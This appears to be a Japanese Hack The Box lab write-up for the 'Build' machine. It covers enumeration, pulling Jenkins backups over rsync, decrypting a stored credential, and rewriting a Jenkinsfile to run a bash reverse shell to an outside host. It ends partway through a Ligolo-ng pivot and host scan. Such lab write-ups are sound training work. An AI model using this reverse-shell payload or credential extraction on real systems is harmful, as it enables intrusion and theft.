![](https://i.imgur.com/MFFHLmO.png)


- URL : https://app.hackthebox.com/machines/Build
- #medium 
- OS : #Linux 
- Machine Author(s):  [xct](https://app.hackthebox.com/users/13569)
- Hack Date: 2025-09-02,13:31

# Enumeration
Principle
1. **目に見えるものだけがすべてではない。** あらゆる視点を考慮しろ
2. 見えていることと、見えていないことを区別しろ
3. **常に情報を得る手段は存在する。** 対象をしっかり理解しろ

## nmap

| ポート      | サービス         | バージョン                                                         | その他                                                             |
| -------- | ------------ | ------------------------------------------------------------- | --------------------------------------------------------------- |
| 22/tcp   | ssh          | OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0) | ホスト鍵: ECDSA `47:21:73:...:d6:7f` / ED25519 `2b:5e:ba:...:7b:f5` |
| 53/tcp   | domain (DNS) | PowerDNS                                                      | `dns-nsid`: NSID=`pdns`, id.server=`pdns`                       |
| 512/tcp  | exec (rexec) | netkit-rsh rexecd                                             | —                                                               |
| 513/tcp  | login        | 不明（login?）                                                    | —                                                               |
| 514/tcp  | shell (rsh)  | Netkit rshd                                                   | —                                                               |
| 873/tcp  | **rsync**    | protocol version 31                                           | —                                                               |
| 3000/tcp | http         | Golang net/http server                                        | タイトル: **Gitea: Git with a cup of tea**／HTTPメソッド: HEAD, GET      |

```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 47:21:73:e2:6b:96:cd:f9:13:11:af:40:c8:4d:d6:7f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEwDujdYYBlK34trPdE896KV0Q89NkU0P+PNYKboWAXcOIzRxia7eKQnOZMDcbpjdpUgTlee4VpIiQwwKLfGLqg=
|   256 2b:5e:ba:f3:72:d3:b3:09:df:25:41:29:09:f4:7b:f5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAhXu4iRkeWtuE4+/w9QwJeecIUqhFrfTiQsmNatD9LG
53/tcp   open  domain  syn-ack ttl 62 PowerDNS
| dns-nsid: 
|   NSID: pdns (70646e73)
|_  id.server: pdns
512/tcp  open  exec    syn-ack ttl 63 netkit-rsh rexecd
513/tcp  open  login?  syn-ack ttl 63
514/tcp  open  shell   syn-ack ttl 63 Netkit rshd
873/tcp  open  rsync   syn-ack ttl 63 (protocol version 31)
3000/tcp open  http    syn-ack ttl 62 Golang net/http server
|_http-title: Gitea: Git with a cup of tea
|_http-favicon: Unknown favicon MD5: F6E1A9128148EEAD9EFF823C540EF471
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/plain;charset=utf-8
|     Set-Cookie: i_like_gitea=0cf5408fdd35be37; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=eYSgvKsc41d1KjlWkTA7Ryqt0bc6MTc1Njc4Nzg2NDM5MTc1MzY5NQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: SAMEORIGIN
|     Date: Tue, 02 Sep 2025 04:37:44 GMT
|     Content-Length: 11
|     found.
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=e6b792fff0385fa0; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=ODeH7uzg5PJmkb5pYB0DTkSa9386MTc1Njc4Nzg0Njg3MzIwMzExOQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Tue, 02 Sep 2025 04:37:26 GMT
|_    Content-Length: 0
| http-methods: 
|_  Supported Methods: HEAD GET
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
```

`Set-Cookie: i_like_gitea=0cf5408fdd35be37`が気になる
- Netkit rshdtyって何？ 
	- https://man.he.net/man1/netkit-rsh
	- rshd は昔の「r系（r-commands）」のリモートシェル用デーモン
	- 典型的に 514/tcp（shell）で待ち受ける
	- 認証は .rhosts / hosts.equiv の“信頼元ホスト”ベース。暗号化なし・なりすましに弱い
	- パスワードの送信（rexec/rlogin）は平文。盗聴・中間者に無防備
	- いまは SSH の完全下位互換みたいな存在
	- 基本は無効化推奨
- Giteaって何？
	- https://about.gitea.com/
	- Gitea は 軽量な自ホスト型 Git サーバ（GitHub/GitLab の軽量版）
	- Go製、GUI で リポジトリ、Issues、PR、Wiki、Actions などが使える


## WebSite
http://10.129.234.169:3000
- ![](https://i.imgur.com/yGDeqy0.png)

アカウント登録をすると、何かリポジトリがある
- ![](https://i.imgur.com/KciAaYi.png)
- http://10.129.234.169:3000/buildadm/dev/src/branch/main/Jenkinsfile
- 何だこれ？
	- Jenkins のパイプライン定義ファイル（Jenkinsfile）
	- このファイルの内容だと
	- `agent any`  
		- どの実行ノード（エージェント）でも動かす、という指定
	- `stages` → `stage('Do nothing')` → `steps` → `sh '/bin/true'`  
		- 1つだけステージを作り、その中で `/bin/true` を実行する
		- `/bin/true` は何もせず 終了コード0（成功）を返すコマンドなので、常に成功する“空の”パイプライン
![](https://i.imgur.com/hfx614C.png)

- http://10.129.234.169:3000/buildadm
	- buildadmユーザーのメールアカウント取得
		- admin@build.vl
	- adminなのが気になる
- ![](https://i.imgur.com/ldweRsV.png)


- パスワードリセット機能は使えない
- ![](https://i.imgur.com/WDB3nMh.png)


- Gitea Version: 1.21.11 
- ![](https://i.imgur.com/JjOnS2v.png)

このバージョンでCVEとかないのかな
一個だけ見つかった
- CVE-2024-6886
	- Stored XSS
	- 対象バージョン : <1.22.1
	- PoC : https://www.exploit-db.com/exploits/52077
	- Stored XSSでbuildadmユーザーのcookieを取得できたりするのかな？

PoCの再現手順に従って、攻撃してみる
1. アプリケーションにログインする
2. 新しいリポジトリを作成する、もしくは既存のリポジトリで、`$username/$repo_name/settings` エンドポイントから **Settings** ボタンをクリックして設定画面を開く。
3. **Description** フィールドに次のペイロードを入力する:
    - `<a href=javascript:alert()>XSS test</a>`
4. 変更を保存する
5. リポジトリの説明をクリックすると、Description フィールドにペイロードが保存されていることが確認できる
6. メッセージ（リンク）をクリックするとアラートボックスが表示され、注入したスクリプトが実行されたことが分かる

devに試す
- `http://10.129.234.169:3000/buildadm/dev/settings`がなさそう
![](https://i.imgur.com/pqClweL.png)

新しいリポジトリを作る
- 効いているように見えない
  ![](https://i.imgur.com/6Z8czb1.png)

無効化されてる？
![](https://i.imgur.com/MwCzhMq.png)

## Rsync
Rsyncが開いているので、確認する
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Build]
└─$ rsync rsync://10.129.234.169/
backups         backups
```

backupsフォルダがある、中身確認する
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Build]
└─$ rsync --list-only rsync://10.129.234.169/backups/
drwxr-xr-x          4,096 2024/05/02 06:26:31 .
-rw-r--r--    376,289,280 2024/05/02 06:26:19 jenkins.tar.gz

```

jenkins.tar.gzがあるので取得する
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Build]
└─$ rm -f jenkins.tar.gz 2>/dev/null                                                                  
 
rsync -avP -4 \
  --timeout=20 --contimeout=10 \
  --partial --append-verify --no-motd \
  rsync://10.129.83.194/backups/jenkins.tar.gz .

receiving incremental file list
jenkins.tar.gz
    376,289,280 100%    1.07MB/s    0:05:35 (xfr#1, to-chk=0/1)

sent 171 bytes  received 376,381,250 bytes  1,108,634.52 bytes/sec
total size is 376,289,280  speedup is 1.00
```

何が含まれているのかをみる
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Build]
└─$ tar -tf jenkins.tar.gz | head
jenkins_configuration/
jenkins_configuration/jenkins.model.ArtifactManagerConfiguration.xml
jenkins_configuration/hudson.plugins.git.GitTool.xml
jenkins_configuration/secrets/
jenkins_configuration/secrets/master.key
jenkins_configuration/secrets/hudson.util.Secret
jenkins_configuration/secrets/hudson.model.Job.serverCookie
jenkins_configuration/secrets/org.jenkinsci.plugins.workflow.log.ConsoleAnnotators.consoleAnnotator
jenkins_configuration/secrets/hudson.console.ConsoleNote.MAC
jenkins_configuration/secrets/jenkins.model.Jenkins.crumbSalt
```

解凍する
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Build]
└─$ tar -xf jenkins.tar.gz
```

気になるフォルダを順に見ていく
jenkins_configuration/users/admin_8569439066427679502/config.xml 
```sh
┌──(kali㉿kali)-[~/…/Build/jenkins_configuration/users/admin_8569439066427679502]
└─$ cat config.xml                   
<?xml version='1.1' encoding='UTF-8'?>
<user>
  <version>10</version>
  <id>admin</id>
  <fullName>admin</fullName>
  <properties>
    <jenkins.console.ConsoleUrlProviderUserProperty/>
    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@1337.v60b_d7b_c7b_c9f">
      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash"/>
    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>
    <hudson.model.MyViewsProperty>
      <views>
        <hudson.model.AllView>
          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>
          <name>all</name>
          <filterExecutors>false</filterExecutors>
          <filterQueue>false</filterQueue>
          <properties class="hudson.model.View$PropertyList"/>
        </hudson.model.AllView>
      </views>
    </hudson.model.MyViewsProperty>
    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin="display-url-api@2.204.vf6fddd8a_8b_e9">
      <providerId>default</providerId>
    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>
    <hudson.model.PaneStatusProperties>
      <collapsed/>
    </hudson.model.PaneStatusProperties>
    <jenkins.security.seed.UserSeedProperty>
      <seed>5a9e1f21231c806b</seed>
    </jenkins.security.seed.UserSeedProperty>
    <hudson.search.UserSearchProperty>
      <insensitiveSearch>true</insensitiveSearch>
    </hudson.search.UserSearchProperty>
    <io.jenkins.plugins.thememanager.ThemeUserProperty plugin="theme-manager@215.vc1ff18d67920"/>
    <hudson.model.TimeZoneProperty/>
    <jenkins.model.experimentalflags.UserExperimentalFlagsProperty>
      <flags/>
    </jenkins.model.experimentalflags.UserExperimentalFlagsProperty>
    <hudson.security.HudsonPrivateSecurityRealm_-Details>
      <passwordHash>#jbcrypt:$2a$10$PaXdGyit8MLC9CEPjgw15.6x0GOIZNAk2gYUTdaOB6NN/9CPcvYrG</passwordHash>
    </hudson.security.HudsonPrivateSecurityRealm_-Details>
    <hudson.tasks.Mailer_-UserProperty plugin="mailer@472.vf7c289a_4b_420">
      <emailAddress>admin@build.vl</emailAddress>
    </hudson.tasks.Mailer_-UserProperty>
    <jenkins.security.ApiTokenProperty>
      <tokenStore>
        <tokenList/>
      </tokenStore>
    </jenkins.security.ApiTokenProperty>
  </properties>
</user>                                                                                                                                         

```
おそらく、admin_8569439066427679502のパスワードハッシュを取得できた
admin_8569439066427679502 : jbcrypt:$2a$10$PaXdGyit8MLC9CEPjgw15.6x0GOIZNAk2gYUTdaOB6NN/9CPcvYrG

jenkins_configuration/users/config.xml 
```sh
┌──(kali㉿kali)-[~/…/machine/Build/jenkins_configuration/users]
└─$ cat users.xml 
<?xml version='1.1' encoding='UTF-8'?>
<hudson.model.UserIdMapper>
  <version>1</version>
  <idToDirectoryNameMap class="concurrent-hash-map">
    <entry>
      <string>admin</string>
      <string>admin_8569439066427679502</string>
    </entry>
  </idToDirectoryNameMap>
</hudson.model.UserIdMapper> 

```

jenkins_configuration/secretsの中のmasterkeyも気になる
```sh
┌──(kali㉿kali)-[~/…/machine/Build/jenkins_configuration/secrets]
└─$ ls -la    
total 40
drwx------  2 kali kali 4096 May  2  2024 .
drwxr-xr-x 17 kali kali 4096 May  2  2024 ..
-rw-r--r--  1 kali kali  272 May  1  2024 hudson.console.AnnotatedLargeText.consoleAnnotator
-rw-r--r--  1 kali kali   48 May  1  2024 hudson.console.ConsoleNote.MAC
-rw-r--r--  1 kali kali   32 May  1  2024 hudson.model.Job.serverCookie
-rw-r--r--  1 kali kali  272 May  1  2024 hudson.util.Secret
-rw-r--r--  1 kali kali   32 May  1  2024 jenkins.model.Jenkins.crumbSalt
-rw-r--r--  1 kali kali  256 May  1  2024 master.key
-rw-r--r--  1 kali kali  272 May  1  2024 org.jenkinsci.main.modules.instance_identity.InstanceIdentity.KEY
-rw-r--r--  1 kali kali  272 May  2  2024 org.jenkinsci.plugins.workflow.log.ConsoleAnnotators.consoleAnnotator

```

```sh
┌──(kali㉿kali)-[~/…/machine/Build/jenkins_configuration/secrets]
└─$ cat master.key
10d818bb21ca659412edeea85092aa706c145bc388acdd0402bf6696ca1123b9fc8e9788be81cc6410d552e14a5c702b9e55fafc8a4207683e0284b7d1fc1f09df811d98eba2d8b493c2f1432e3ee2d8fc7b480114dce701026aa8ff1166db3d93e1b1673f3187184604c53829047cf4f0b57c72438adbcb155913087bbad74a
```

jenkins_configuration/config.xml
```sh
┌──(kali㉿kali)-[~/…/HTB/machine/Build/jenkins_configuration]
└─$ cat config.xml          
<?xml version='1.1' encoding='UTF-8'?>
<hudson>
  <disabledAdministrativeMonitors>
    <string>jenkins.diagnostics.SecurityIsOffMonitor</string>
    <string>jenkins.diagnostics.ControllerExecutorsNoAgents</string>
    <string>hudson.util.DoubleLaunchChecker</string>
  </disabledAdministrativeMonitors>
  <version>2.441</version>
  <numExecutors>2</numExecutors>
  <mode>NORMAL</mode>
  <useSecurity>true</useSecurity>
  <authorizationStrategy class="hudson.security.AuthorizationStrategy$Unsecured"/>
  <securityRealm class="hudson.security.SecurityRealm$None"/>
  <disableRememberMe>false</disableRememberMe>
  <projectNamingStrategy class="jenkins.model.ProjectNamingStrategy$DefaultProjectNamingStrategy"/>
  <workspaceDir>${JENKINS_HOME}/workspace/${ITEM_FULL_NAME}</workspaceDir>
  <buildsDir>${ITEM_ROOTDIR}/builds</buildsDir>
  <jdks/>
  <viewsTabBar class="hudson.views.DefaultViewsTabBar"/>
  <myViewsTabBar class="hudson.views.DefaultMyViewsTabBar"/>
  <clouds/>
  <quietPeriod>5</quietPeriod>
  <scmCheckoutRetryCount>0</scmCheckoutRetryCount>
  <views>
    <hudson.model.AllView>
      <owner class="hudson" reference="../../.."/>
      <name>all</name>
      <filterExecutors>false</filterExecutors>
      <filterQueue>false</filterQueue>
      <properties class="hudson.model.View$PropertyList"/>
    </hudson.model.AllView>
  </views>
  <primaryView>all</primaryView>
  <slaveAgentPort>50000</slaveAgentPort>
  <label></label>
  <crumbIssuer class="hudson.security.csrf.DefaultCrumbIssuer">
    <excludeClientIPFromCrumb>false</excludeClientIPFromCrumb>
  </crumbIssuer>
  <nodeProperties/>
  <globalNodeProperties/>
  <nodeRenameMigrationNeeded>false</nodeRenameMigrationNeeded>
</hudson>  
```

masterkeyなどがあるので、[jenkins-credentials-decryptor](https://github.com/hoto/jenkins-credentials-decryptor)を使おうと思ったが、hudson.util.Secretがフォルダ内に含まれていないので、使用できなさそう
- https://github.com/hoto/jenkins-credentials-decryptor

また、探し続けると、buildadmというユーザー名とパスワードが含まれているファイルを見つけた
jenkins_configuration/jobs/build/config.xml 
```sh
┌──(kali㉿kali)-[~/…/Build/jenkins_configuration/jobs/build]
└─$ cat config.xml                   
<?xml version='1.1' encoding='UTF-8'?>
<jenkins.branch.OrganizationFolder plugin="branch-api@2.1163.va_f1064e4a_a_f3">
  <actions/>
  <description>dev</description>
  <displayName>dev</displayName>
  <properties>
    <jenkins.branch.OrganizationChildHealthMetricsProperty>
      <templates>
        <com.cloudbees.hudson.plugins.folder.health.WorstChildHealthMetric plugin="cloudbees-folder@6.901.vb_4c7a_da_75da_3">
          <nonRecursive>false</nonRecursive>
        </com.cloudbees.hudson.plugins.folder.health.WorstChildHealthMetric>
      </templates>
    </jenkins.branch.OrganizationChildHealthMetricsProperty>
    <jenkins.branch.OrganizationChildOrphanedItemsProperty>
      <strategy class="jenkins.branch.OrganizationChildOrphanedItemsProperty$Inherit"/>
    </jenkins.branch.OrganizationChildOrphanedItemsProperty>
    <jenkins.branch.OrganizationChildTriggersProperty>
      <templates>
        <com.cloudbees.hudson.plugins.folder.computed.PeriodicFolderTrigger plugin="cloudbees-folder@6.901.vb_4c7a_da_75da_3">
          <spec>H H/4 * * *</spec>
          <interval>86400000</interval>
        </com.cloudbees.hudson.plugins.folder.computed.PeriodicFolderTrigger>
      </templates>
    </jenkins.branch.OrganizationChildTriggersProperty>
    <com.cloudbees.hudson.plugins.folder.properties.FolderCredentialsProvider_-FolderCredentialsProperty plugin="cloudbees-folder@6.901.vb_4c7a_da_75da_3">
      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash">
        <entry>
          <com.cloudbees.plugins.credentials.domains.Domain plugin="credentials@1337.v60b_d7b_c7b_c9f">
            <specifications/>
          </com.cloudbees.plugins.credentials.domains.Domain>
          <java.util.concurrent.CopyOnWriteArrayList>
            <com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl plugin="credentials@1337.v60b_d7b_c7b_c9f">
              <id>e4048737-7acd-46fd-86ef-a3db45683d4f</id>
              <description></description>
              <username>buildadm</username>
              <password>{AQAAABAAAAAQUNBJaKiUQNaRbPI0/VMwB1cmhU/EHt0chpFEMRLZ9v0=}</password>
              <usernameSecret>false</usernameSecret>
            </com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
          </java.util.concurrent.CopyOnWriteArrayList>
        </entry>
      </domainCredentialsMap>
    </com.cloudbees.hudson.plugins.folder.properties.FolderCredentialsProvider_-FolderCredentialsProperty>
    <jenkins.branch.NoTriggerOrganizationFolderProperty>
      <branches>.*</branches>
      <strategy>NONE</strategy>
    </jenkins.branch.NoTriggerOrganizationFolderProperty>
  </properties>
  <folderViews class="jenkins.branch.OrganizationFolderViewHolder">
    <owner reference="../.."/>
  </folderViews>
  <healthMetrics/>
  <icon class="jenkins.branch.MetadataActionFolderIcon">
    <owner class="jenkins.branch.OrganizationFolder" reference="../.."/>
  </icon>
  <orphanedItemStrategy class="com.cloudbees.hudson.plugins.folder.computed.DefaultOrphanedItemStrategy" plugin="cloudbees-folder@6.901.vb_4c7a_da_75da_3">
    <pruneDeadBranches>true</pruneDeadBranches>
    <daysToKeep>-1</daysToKeep>
    <numToKeep>-1</numToKeep>
    <abortBuilds>false</abortBuilds>
  </orphanedItemStrategy>
  <triggers>
    <com.cloudbees.hudson.plugins.folder.computed.PeriodicFolderTrigger plugin="cloudbees-folder@6.901.vb_4c7a_da_75da_3">
      <spec>* * * * *</spec>
      <interval>60000</interval>
    </com.cloudbees.hudson.plugins.folder.computed.PeriodicFolderTrigger>
  </triggers>
  <disabled>false</disabled>
  <navigators>
    <org.jenkinsci.plugin.gitea.GiteaSCMNavigator plugin="gitea@1.4.7">
      <serverUrl>http://172.18.0.2:3000</serverUrl>
      <repoOwner>buildadm</repoOwner>
      <credentialsId>e4048737-7acd-46fd-86ef-a3db45683d4f</credentialsId>
      <traits>
        <org.jenkinsci.plugin.gitea.BranchDiscoveryTrait>
          <strategyId>1</strategyId>
        </org.jenkinsci.plugin.gitea.BranchDiscoveryTrait>
        <org.jenkinsci.plugin.gitea.OriginPullRequestDiscoveryTrait>
          <strategyId>1</strategyId>
        </org.jenkinsci.plugin.gitea.OriginPullRequestDiscoveryTrait>
        <org.jenkinsci.plugin.gitea.ForkPullRequestDiscoveryTrait>
          <strategyId>1</strategyId>
          <trust class="org.jenkinsci.plugin.gitea.ForkPullRequestDiscoveryTrait$TrustContributors"/>
        </org.jenkinsci.plugin.gitea.ForkPullRequestDiscoveryTrait>
      </traits>
    </org.jenkinsci.plugin.gitea.GiteaSCMNavigator>
  </navigators>
  <projectFactories>
    <org.jenkinsci.plugins.workflow.multibranch.WorkflowMultiBranchProjectFactory plugin="workflow-multibranch@773.vc4fe1378f1d5">
      <scriptPath>Jenkinsfile</scriptPath>
    </org.jenkinsci.plugins.workflow.multibranch.WorkflowMultiBranchProjectFactory>
  </projectFactories>
  <buildStrategies/>
  <strategy class="jenkins.branch.DefaultBranchPropertyStrategy">
    <properties class="empty-list"/>
  </strategy>
</jenkins.branch.OrganizationFolder>                                                                                                                                         

```

AESで暗号化されたパスワードで取得することができた
buildadm : AQAAABAAAAAQUNBJaKiUQNaRbPI0/VMwB1cmhU/EHt0chpFEMRLZ9v0=


**Dockerを立ち上げる**
Dockerを立ち上げて、バックアップフォルダに含まれている秘密鍵で、復号化する

backupsを解凍したルートフォルダで以下のコマンドを実行する
```sh
┌──(kali㉿kali)-[~/…/HTB/machine/Build/jenkins_configuration]
└─$ sudo docker run --rm -it -p 8080:8080 -v "$PWD:/var/jenkins_home" jenkins/jenkins:lts-jdk17  
```

そして、上で取得したパスワードを復号化する
- http://localhost:8080/manage/script
![](https://i.imgur.com/CO9qlOH.png)

復号化が成功し、平文の認証情報を取得できた
### buildadmの認証情報
buildadm : Git1234!

buildadmでログインできる
![](https://i.imgur.com/lAwKmVd.png)


SSHにもログインできるのか試す
- できない
```sh
┌──(kali㉿kali)-[~/…/HTB/machine/Build/jenkins_configuration]
└─$ sshpass -p 'Git1234!' \
  ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no \
      -o StrictHostKeyChecking=no buildadm@10.129.83.194

Permission denied, please try again.
                                                                                                                                         
┌──(kali㉿kali)-[~/…/HTB/machine/Build/jenkins_configuration]
└─$ sshpass -p 'Git1234!' \
  ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no \
      -o StrictHostKeyChecking=no admin@10.129.83.194

Permission denied, please try again.
```


# Foothold

Jenkinsfileを書き換えることで、リバースシェルを取得する
```bash
┌──(kali㉿kali)-[~/…/HTB/machine/Build/jenkins_configuration]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

リバースシェルが飛んでくるように、書き換える

![](https://i.imgur.com/vIBoPOt.png)

書き換えるコード
```sh
pipeline {
  agent any
  stages {
    stage('revshell') {
      steps {
        sh 'bash -c "bash -i >& /dev/tcp/10.10.14.62/4444 0>&1"'
      }
    }
  }
}

```

リバースシェルを発火させる
```bash
┌──(kali㉿kali)-[~/…/HTB/machine/Build/jenkins_configuration]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.62] from (UNKNOWN) [10.129.83.194] 35510
bash: cannot set terminal process group (7): Inappropriate ioctl for device
bash: no job control in this shell
root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main# ls
ls
Jenkinsfile
root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main# 


```

リバースシェルが取得できた
```bash
root@5ac6c7d6fb8e:/home# find / -type f -iname "user.txt" 2>/dev/null
/root/user.txt
root@5ac6c7d6fb8e:/home# cat /root/user.txt
```
root権限でシェルに入っている

opasswdがあるかなと思ったけど、特に入っていなさそう
```bash
root@5ac6c7d6fb8e:/etc/security# ls -la
ls -la
total 56
drwxr-xr-x 4 root root 4096 Jan 10  2024 .
drwxr-xr-x 1 root root 4096 May  9  2024 ..
-rw-r--r-- 1 root root 4564 Sep 21  2023 access.conf
-rw-r--r-- 1 root root 2234 Sep 21  2023 faillock.conf
-rw-r--r-- 1 root root 3635 Sep 21  2023 group.conf
-rw-r--r-- 1 root root 2752 Sep 21  2023 limits.conf
drwxr-xr-x 2 root root 4096 Sep 21  2023 limits.d
-rw-r--r-- 1 root root 1637 Sep 21  2023 namespace.conf
drwxr-xr-x 2 root root 4096 Sep 21  2023 namespace.d
-rwxr-xr-x 1 root root 1016 Sep 21  2023 namespace.init
-rw------- 1 root root    0 Jan 10  2024 opasswd
-rw-r--r-- 1 root root 2971 Sep 21  2023 pam_env.conf
-rw-r--r-- 1 root root  418 Sep 21  2023 sepermit.conf
-rw-r--r-- 1 root root 2179 Sep 21  2023 time.conf
```

```bash
root@5ac6c7d6fb8e:/# cat /etc/*release
cat /etc/*release
PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
NAME="Debian GNU/Linux"
VERSION_ID="12"
VERSION="12 (bookworm)"
VERSION_CODENAME=bookworm
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"

```

```bash
root@5ac6c7d6fb8e:/# uname -a
uname -a
Linux 5ac6c7d6fb8e 5.15.0-144-generic #157-Ubuntu SMP Mon Jun 16 07:33:10 UTC 2025 x86_64 GNU/Linux

```

この環境が、Docker環境なのかを確かめる
```bash
root@5ac6c7d6fb8e:~/.ssh# sh -c '[ -f /.dockerenv ]&&{ echo "→ container: docker (/.dockerenv)"; exit; }; \
[ -f /.containerenv ]&&{ echo "→ container: podman/oci (/.containerenv)"; exit; }; \
t=$(grep -Eo "docker|kubepods|containerd|podman|lxc" /proc/1/cgroup 2>/dev/null|head -1); \
[ -n "$t" ]&&{ echo "→ container (cgroup: $t)"; exit; }; \
[ -d /var/run/secrets/kubernetes.io ]&&{ echo "→ container: kubernetes pod"; exit; }; \
command -v systemd-detect-virt >/dev/null 2>&1 && systemd-detect-virt --container >/dev/null 2>&1 && { echo "→ container: $(systemd-detect-virt --container)"; exit; }; \
p1=$(ps -p 1 -o comm= 2>/dev/null); case "$p1" in systemd|init) echo "→ host (pid1=$p1)";; *) echo "→ maybe container (pid1=$p1)";; esac'
→ container: docker (/.dockerenv)

```
Docker環境であることがわかる

# Privilege Escalation
ユーザーフラグの取得で詰まったので、以下のwriteupを見ました
そのため、詳細は以下のリンクを参照してください。
- https://0xdf.gitlab.io/2025/08/05/htb-build.html


Ligolo-ngを使ってホストマシンにアクセスする
設定する
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Build]
└─$ sudo ./proxy -selfcert
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
INFO[0000] Listening on 0.0.0.0:11601                   
INFO[0000] Starting Ligolo-ng Web, API URL is set to: http://127.0.0.1:8080 
WARN[0000] Ligolo-ng API is experimental, and should be running behind a reverse-proxy if publicly exposed. 
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.8

ligolo-ng » interface_create --name ligolo0
INFO[0219] Creating a new ligolo0 interface...          
INFO[0219] Interface created!                           
ligolo-ng » INFO[1174] Agent joined.                                 id=0242ac120003 name=root@5ac6c7d6fb8e remote="10.129.234.169:59468"
ligolo-ng » 
ligolo-ng » session
? Specify a session : 1 - root@5ac6c7d6fb8e - 10.129.234.169:59468 - 0242ac120003
[Agent : root@5ac6c7d6fb8e] » tunnel_start --tun ligolo0
INFO[1192] Starting tunnel to root@5ac6c7d6fb8e (0242ac120003) 
[Agent : root@5ac6c7d6fb8e] » ifconfig
┌────────────────────────────────────┐
│ Interface 0                        │
├──────────────┬─────────────────────┤
│ Name         │ lo                  │
│ Hardware MAC │                     │
│ MTU          │ 65536               │
│ Flags        │ up|loopback|running │
│ IPv4 Address │ 127.0.0.1/8         │
└──────────────┴─────────────────────┘
┌───────────────────────────────────────────────┐
│ Interface 1                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ eth0                           │
│ Hardware MAC │ 02:42:ac:12:00:03              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 172.18.0.3/16                  │
└──────────────┴────────────────────────────────┘
[Agent : root@5ac6c7d6fb8e] »  


```

agentも起動させる
```sh
root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main# ./agent -connect 10.10.14.62:11601 -ignore-cert
<in# ./agent -connect 10.10.14.62:11601 -ignore-cert          
time="2025-09-04T05:25:21Z" level=warning msg="warning, certificate validation disabled"
time="2025-09-04T05:25:21Z" level=info msg="Connection established" addr="10.10.14.62:11601"

```

```bash
sudo ip route add 172.18.0.0/16 dev ligolo0
```

疎通確認
```bash
└─$ ping -c 1 172.18.0.3 
PING 172.18.0.3 (172.18.0.3) 56(84) bytes of data.
64 bytes from 172.18.0.3: icmp_seq=1 ttl=64 time=200 ms

--- 172.18.0.3 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 200.201/200.201/200.201/0.000 ms

```

疎通できたので、これでdockerを動かしているホストにアクセスできる
- 通常、Docker は内部ネットワークに **ゲートウェイ IP** を持ち、例えば 172.18.0.0/16 のネットなら、多くの場合 **172.18.0.1** がホスト側のアドレスになる
- なので、ここでも172.18.0.1にアクセスできる

nmapのスキャンを172.18.0.1に回すと、dockerでは開いていない、3306番(mysql)と、8081番が開いていることがわかる
```sh

PORT     STATE SERVICE          REASON         VERSION
22/tcp   open  ssh              syn-ack ttl 64 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
53/tcp   open  domain           syn-ack ttl 64 PowerDNS
| dns-nsid: 
|   NSID: pdns (70646e73)
|_  id.server: pdns
512/tcp  open  exec             syn-ack ttl 64 netkit-rsh rexecd
